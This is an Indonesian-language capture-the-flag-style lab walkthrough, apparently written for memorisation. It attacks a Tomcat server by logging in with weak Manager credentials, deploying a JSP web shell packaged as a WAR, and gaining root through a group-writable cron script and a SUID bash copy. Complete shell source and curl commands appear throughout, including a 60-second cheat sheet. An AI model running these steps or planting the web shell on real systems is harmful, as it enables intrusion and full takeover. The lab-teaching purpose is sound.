# Write-Up Lab Catalina — Versi Closed Book

> **Ruang lingkup:** hanya untuk laboratorium atau sistem yang telah memberikan izin pengujian.

## 1. Gambaran Singkat

| Komponen | Nilai |
|---|---|
| Target | `192.168.56.117:8081` |
| Service | Apache Tomcat |
| Credential | `tomcat:s3cret` |
| Foothold | RCE sebagai `tomcat` |
| Privilege escalation | Cron root menjalankan script writable |
| Akses akhir | `root` |

Rantai serangan:

```text
Tomcat Manager
→ credential lemah
→ deploy WAR
→ RCE sebagai tomcat
→ cron root
→ script writable oleh group tomcat
→ root
```

## 2. Mnemonic: M-W-C-R

```text
M = Manager ditemukan
W = WAR di-deploy
C = Cron diperiksa
R = Root diperoleh
```

Command yang harus diingat:

```bash
dirsearch -u http://192.168.56.117:8081
nikto -h http://192.168.56.117:8081
curl -u tomcat:s3cret http://192.168.56.117:8081/manager/text/list
curl -u tomcat:s3cret --upload-file labcmd.war \
  "http://192.168.56.117:8081/manager/text/deploy?path=/labcmd&update=true"
curl -sG --data-urlencode "cmd=id" \
  http://192.168.56.117:8081/labcmd/cmd.jsp
```

---

# Fase 1 — Menemukan Tomcat Manager

## 3. Reconnaissance

```bash
nmap -Pn -sC -sV -p8081 192.168.56.117
dirsearch -u http://192.168.56.117:8081
```

Temuan yang dicari:

```text
8081/tcp open
/manager
/manager/html
```

Status `401 Unauthorized` pada `/manager/html` berarti endpoint ada, tetapi memerlukan autentikasi.

Validasi:

```bash
curl -i http://192.168.56.117:8081/manager/html
```

Indikator:

```text
HTTP/1.1 401
WWW-Authenticate: Basic realm="Tomcat Manager Application"
```

## 4. Mencari dan Memvalidasi Credential

```bash
nikto -h http://192.168.56.117:8081
```

Temuan lab:

```text
Username : tomcat
Password : s3cret
```

Jangan hanya percaya scanner. Validasi manual:

```bash
curl -s -u tomcat:s3cret \
  http://192.168.56.117:8081/manager/text/list
```

Indikator berhasil:

```text
OK - Listed applications
```

**Ingat:** scanner memberi petunjuk; `curl` memberi bukti.

---

# Fase 2 — Deploy WAR dan Mendapatkan RCE

## 5. Membuat JSP Command Runner

```bash
mkdir -p ~/catalina-lab/labcmd
cd ~/catalina-lab/labcmd

cat > cmd.jsp <<'EOF'
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");

if (cmd != null) {
    Process p = new ProcessBuilder("/bin/sh", "-c", cmd)
        .redirectErrorStream(true)
        .start();

    InputStream input = p.getInputStream();
    int data;

    out.print("<pre>");

    while ((data = input.read()) != -1) {
        out.print((char) data);
    }

    out.print("</pre>");
}
%>
EOF
```

Paketkan menjadi WAR:

```bash
zip -r ../labcmd.war cmd.jsp
cd ..
```

## 6. Deploy ke Tomcat Manager

```bash
curl -u tomcat:s3cret \
  --upload-file labcmd.war \
  "http://192.168.56.117:8081/manager/text/deploy?path=/labcmd&update=true"
```

Indikator berhasil:

```text
OK - Deployed application at context path [/labcmd]
```

Definisikan URL web shell:

```bash
SHELL_URL="http://192.168.56.117:8081/labcmd/cmd.jsp"
```

Uji command execution:

```bash
curl -sG --data-urlencode "cmd=id" "$SHELL_URL"
```

Hasil:

```text
uid=997(tomcat) gid=997(tomcat)
```

Foothold berhasil sebagai user `tomcat`.

---

# Fase 3 — Menemukan Jalur Privilege Escalation

## 7. Enumerasi Dasar

```bash
curl -sG \
  --data-urlencode "cmd=id; whoami; hostname; pwd" \
  "$SHELL_URL"
```

Fokus jawaban:

```text
User saat ini siapa?
Hostname apa?
Apakah sudah root?
```

## 8. Memeriksa Cron

```bash
curl -sG \
  --data-urlencode \
  "cmd=cat /etc/crontab 2>/dev/null; cat /etc/cron.d/* 2>/dev/null" \
  "$SHELL_URL"
```

Temuan penting:

```cron
* * * * * root /opt/backup/backup.sh
```

Artinya, setiap menit `root` menjalankan:

```text
/opt/backup/backup.sh
```

## 9. Memeriksa Permission Script

```bash
curl -sG \
  --data-urlencode \
  "cmd=stat -c '%A %U %G %n' /opt/backup/backup.sh; cat /opt/backup/backup.sh" \
  "$SHELL_URL"
```

Hasil:

```text
-rwxrwxr-x root tomcat /opt/backup/backup.sh
```

Baca permission:

```text
owner root   : rwx
group tomcat : rwx
other        : r-x
```

User saat ini adalah `tomcat`, sehingga script dapat ditulis oleh user yang sedang dikuasai. Karena script dijalankan cron sebagai `root`, command yang disisipkan juga berjalan sebagai `root`.

**Rumus yang harus diingat:**

```text
Cron root + script writable = privilege escalation
```

---

# Fase 4 — Membuktikan dan Mendapatkan Root

## 10. Backup Script

```bash
curl -sG \
  --data-urlencode \
  "cmd=cp /opt/backup/backup.sh /tmp/backup.sh.bak" \
  "$SHELL_URL"
```

## 11. Bukti Non-Destruktif

Tambahkan command untuk menulis hasil `id`:

```bash
curl -sG \
  --data-urlencode \
  "cmd=printf '\nid > /tmp/root_proof\n' >> /opt/backup/backup.sh" \
  "$SHELL_URL"
```

Setelah cron berjalan, periksa:

```bash
curl -sG \
  --data-urlencode \
  "cmd=cat /tmp/root_proof; ls -l /tmp/root_proof" \
  "$SHELL_URL"
```

Indikator:

```text
uid=0(root) gid=0(root)
root root /tmp/root_proof
```

## 12. Membuat SUID Bash

Tambahkan payload:

```bash
curl -sG \
  --data-urlencode \
  "cmd=printf '\ncp /bin/bash /tmp/rootbash\nchmod 4755 /tmp/rootbash\n' >> /opt/backup/backup.sh" \
  "$SHELL_URL"
```

Setelah cron berjalan, validasi:

```bash
curl -sG \
  --data-urlencode \
  "cmd=ls -l /tmp/rootbash; /tmp/rootbash -p -c 'id; whoami'" \
  "$SHELL_URL"
```

Indikator akhir:

```text
euid=0(root)
root
```

> Opsi `-p` mempertahankan effective UID pada Bash SUID.

---

# 13. Cleanup

Setelah bukti diperoleh:

```bash
curl -sG \
  --data-urlencode \
  "cmd=cp /tmp/backup.sh.bak /opt/backup/backup.sh; rm -f /tmp/root_proof /tmp/rootbash" \
  "$SHELL_URL"
```

Undeploy aplikasi lab:

```bash
curl -u tomcat:s3cret \
  "http://192.168.56.117:8081/manager/text/undeploy?path=/labcmd"
```

---

# 14. Cheat Sheet 60 Detik

```bash
# 1. Temukan manager dan credential
dirsearch -u http://192.168.56.117:8081
nikto -h http://192.168.56.117:8081
curl -u tomcat:s3cret http://192.168.56.117:8081/manager/text/list

# 2. Deploy WAR
curl -u tomcat:s3cret --upload-file labcmd.war \
"http://192.168.56.117:8081/manager/text/deploy?path=/labcmd&update=true"

# 3. RCE
SHELL_URL="http://192.168.56.117:8081/labcmd/cmd.jsp"
curl -sG --data-urlencode "cmd=id" "$SHELL_URL"

# 4. Cron dan permission
curl -sG --data-urlencode \
"cmd=cat /etc/cron.d/backup; stat -c '%A %U %G %n' /opt/backup/backup.sh" \
"$SHELL_URL"

# 5. Root
curl -sG --data-urlencode \
"cmd=printf '\ncp /bin/bash /tmp/rootbash\nchmod 4755 /tmp/rootbash\n' >> /opt/backup/backup.sh" \
"$SHELL_URL"

curl -sG --data-urlencode \
"cmd=/tmp/rootbash -p -c 'id; whoami'" \
"$SHELL_URL"
```

## Kalimat Hafalan

```text
Manager terbuka, credential lemah, deploy WAR,
masuk sebagai tomcat, cari cron, cek permission,
tulis script root, lalu jalankan rootbash -p.
```
